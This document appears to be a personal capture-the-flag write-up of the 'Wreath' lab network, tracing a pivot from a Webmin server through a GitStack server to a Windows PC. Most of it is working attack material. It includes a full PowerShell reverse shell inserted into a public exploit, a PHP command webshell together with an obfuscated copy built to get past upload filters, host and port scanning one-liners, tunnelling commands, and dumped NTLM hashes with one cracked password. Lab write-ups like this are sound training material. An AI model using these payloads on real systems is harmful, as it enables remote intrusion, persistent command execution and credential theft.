# Wreath
> Silver Garcia - May 19th, 2024

Initial information:
_There are two machines on my home network that host projects and stuff I'm working on in my own time -- one of them has a webserver that's port forwarded, so that's your way in if you can find a vulnerability! It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. See if you can get into these! My own PC is also on that network, but I doubt you'll be able to get into that as it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. Well, I say PC -- it's technically a repurposed server because I had a spare license lying around, but same difference._

## Web server
### Enumeration
Nmap
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-19 18:02 EDT
Nmap scan report for 10.200.84.200
Host is up (0.19s latency).
Not shown: 14900 filtered tcp ports (no-response), 96 filtered tcp ports (admin-prohibited)
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_http-title: Did not follow redirect to https://thomaswreath.thm
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: Thomas Wreath | Developer
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Not valid before: 2024-05-19T21:50:11
|_Not valid after:  2025-05-19T21:50:11
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Aggressive OS guesses: HP P2000 G3 NAS device (89%), Linux 2.6.32 (88%), Infomir MAG-250 set-top box (88%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (88%), Linux 5.0 (88%), Linux 5.0 - 5.4 (88%), Linux 5.1 (88%), Ubiquiti AirOS 5.5.9 (88%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (88%), Linux 2.6.32 - 3.13 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 9090/tcp)
HOP RTT       ADDRESS
1   192.87 ms 10.50.85.1
2   189.87 ms 10.200.84.200
```

### Getting access
RCE vulnerability on MiniServ 1.890 (CVE-2019-15107).

## Inside network

### Enumeration
One-liner script to discover new hosts:
```bash
[root@prod-serv ~]# for i in {1..255}; do (ping -c 1 10.200.84.${i} | grep "bytes from" &); done
64 bytes from 10.200.84.1: icmp_seq=1 ttl=255 time=0.310 ms
64 bytes from 10.200.84.150: icmp_seq=1 ttl=128 time=0.546 ms
64 bytes from 10.200.84.200: icmp_seq=1 ttl=64 time=0.056 ms
64 bytes from 10.200.84.250: icmp_seq=1 ttl=64 time=0.469 ms
```

One-liner script to scan open ports:
```bash
for i in {1..65535}; do (echo > /dev/tcp/<ip>/$i) >/dev/null 2>&1 && echo $i is open; done
```

Port scan on 10.200.84.150
```
80 is open
135 is open
139 is open
445 is open
3389 is open
5357 is open
5985 is open
```

### Git server
GitStack server running on 10.200.84.150

#### Getting access
Got access using gistack exploit (43777 on EDB).
1. Create SSH tunnel to 10.200.84.150:80
```bash
ssh -i id_rsa -L 80:10.200.84.200:80 root@10.200.84.200 -fN
```
2. Check if tunnel is working correctly.
3. Change the command variable on the exploit to get a revershell:
```powershell
powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.200.84.200',7777);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"
```
4. Start listener and execute exploit

Got access as System user, no need for Privilege Escalation

Dumped sam database:
```
Administrator:37db630168e5f82aafa8461e05c6bbd1
Thomas:02d90eda8f6b6b06c32d5f207831101f
```
Thomas cracked password
02d90eda8f6b6b06c32d5f207831101f:i<3ruby

### Personal Computer

Got access pivoting through werbserver and Git server
1. Used sshuttle to tunnel traffic through compromised werbserver:
```bash
sshuttle 
```
2. Used chisel to create a forward proxy on Git server:
	On Git server:
	```bash
	.\chisel server -p 20000 --socks5
	```

	On attack machine:
	```bash
	./chisel client 10.84.200.150:20000 20001:socks
	```
3. Got access to web page on personal computer

#### Getting access
**Got access to /resources directory with `thomas:i<3ruby` credentials**

The `/resources` directory allows us to upload files. Although it has some file type protection, they can be bypassed.

PHP webshell code to be uploaded:
```bash
<?php
    $cmd = $_GET["wreath"];
    if(isset($cmd)){
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
    die();
?>
```

Obfuscated on https://www.gaijin.at/en/tools/php-obfuscator:
```bash
<?php \$z0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$z0)){echo base64_decode('PHByZT4=').shell_exec(\$z0).base64_decode('PC9wcmU+');}die();?>
```


SAM database:
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up...
```
